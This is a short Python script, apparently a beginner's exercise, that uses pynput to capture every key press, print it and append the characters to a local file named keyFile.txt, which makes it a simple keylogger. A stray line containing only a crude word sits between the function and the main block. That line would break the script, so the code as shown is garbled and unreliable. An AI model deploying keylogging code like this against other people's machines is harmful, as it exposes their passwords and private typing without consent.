from pynput import keyboard #capture key events from user

def keyPressed(key):
    print(str(key))
    with open("keyFile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting character")

dicks

if __name__ == "__main__":
    #create a listener object
    listener = keyboard.Listener(on_press = keyPressed) #on press auto passses the key to the function
    listener.start() #object created so can be interacted with
    input()


